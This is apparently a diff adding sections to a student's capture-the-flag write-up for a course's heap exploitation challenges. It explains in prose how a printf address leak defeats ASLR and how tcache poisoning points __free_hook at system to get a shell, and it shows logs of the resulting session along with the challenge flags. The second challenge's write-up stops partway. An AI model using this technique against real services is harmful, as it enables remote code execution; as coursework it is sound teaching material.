@@ -187,3 +187,109 @@ And the script produced:
 That's it!                                                                                                                                                                                                                                  
 Here's your flag, friend: flag{S1LLY_malloc_U_shuld_m3ms3t!_74ad88e5fba05bb6}
 ```
+## Challenge - Biiiiig Message Server
+```
+Can you make the message server cough up the flag??
+
+nc offsec-chalbroker.osiris.cyber.nyu.edu 1213
+```
+Checking the binary:
+
+```aiignore
+8$ checksec --file big_message_server
+[*] '/mnt/csgy9223_IntroOffSec/week_8/big_message_server'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+Running the binary:
+```aiignore
+ ./big_message_server
+Welcome to the OffSec queue!
+We store all your feedback in a fancy queue until
+          you're ready to send
+Let's start out by giving you a helpful message: ���r�
+Choose an option:
+1. Add message
+2. Review message
+3. Edit message
+4. Send messages
+>
+```
+Notice the unprintable characters. Those are the address of printf(). I'll start by creating a solver script to use this information to break ASLR.
+
+```aiignore
+printf_address: 0x7ffff7e2ec90 
+libc.address: 0x7ffff7dcd000
+
+0x00007ffff7dcd000 0x00007ffff7def000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
+```
+I have broken ASLR with the correct address. Now to move on to tcache poisoning.
+
+Looks like the messages are linked lists where the first 8 bytes points to the next message. An interesting observation is that while each message is 0x48 bytes, the edit() function takes in 0x60 bytes. This may allow us to overwrite the first 8 bytes of the next message.
+
+As it turns out, they way it selects which message to edit or send is by going through the linked list and using the address of message index - 1 + 0x8 bytes to set the values for edit and  send. We can use this to poison free_hook to point to system and to pass /bin/sh to system.
+
+We will need to add 3 messages (0, 1, 2). Editing message 0, will allow us to modify the next message pointer of message 1. We set this to fee_hook - 0x8 bytes. That way when we go to edit message 2, 0x8 bytes will be added back by the process.
+
+Next we edit message 2, which we set the previous pointer to free_hook - 0x8, will actually allow us to set the value for free_hook, which we will point to system.
+
+Next we have to poison message 1's next message pointer to point to a bin/sh string. We can get the address of this from ELF and glibc. What this does is pass this address to free_hook (system) when a send on message 2 is initiated and the memory for message 2 is freed. But actually, the binary tries to free the address of /bin/sh and passes it nicely for us to system.
+
+Final results:
+```aiignore
+$ ls
+[DEBUG] Sent 0x3 bytes:
+    b'ls\n'
+[DEBUG] Received 0x1c bytes:
+    b'big_message_server\n'
+    b'flag.txt\n'
+big_message_server
+flag.txt
+$ cat flag.txt
+[DEBUG] Sent 0xd bytes:
+    b'cat flag.txt\n'
+[DEBUG] Received 0x32 bytes:
+    b'flag{Unb0und3d_AND_0V3rfl0w1ng!_d18392739d0d5f6b}\n'
+flag{Unb0und3d_AND_0V3rfl0w1ng!_d18392739d0d5f6b}
+```
+
+## Challenge - Useful (and FUN) Message Server
+```
+Can you make the message server cough up the flag??
+
+nc offsec-chalbroker.osiris.cyber.nyu.edu 1212
+```
+Inspecting the binary:
+```aiignore
+$ checksec useful_and_fun_message_server
+[*] '/mnt/csgy9223_IntroOffSec/week_8/useful_and_fun_message_server'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+Running the binary:
+```aiignore
+$ ./useful_and_fun_message_server
+Welcome to the OffSec queue!
+We store all your feedback in a fancy queue until
+          you're ready to send
+Let's start out by giving you a helpful message: L<
+Choose an option:
+1. Add message
+2. Review message
+3. Edit message
+4. Send messages
+>
+```
+Once again some unprintable characters are provided after "helpful message: ". Again this is the address for printf().
